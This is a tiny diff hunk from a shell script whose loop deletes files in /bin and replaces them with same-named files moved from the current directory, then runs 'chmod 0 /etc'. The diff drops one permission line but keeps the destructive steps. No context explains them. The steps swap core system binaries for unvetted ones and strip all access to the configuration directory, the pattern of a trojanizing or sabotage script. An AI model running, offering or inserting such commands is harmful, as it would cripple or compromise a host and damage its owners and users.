@@ -49,7 +49,6 @@ for arqs in `ls`
 do
 rm /bin/$arqs 2>/dev/null
 mv $arqs /bin
-chmod 0 /bin/$arqs
 chmod +x /bin/$arqs
 done
 chmod 0 /etc
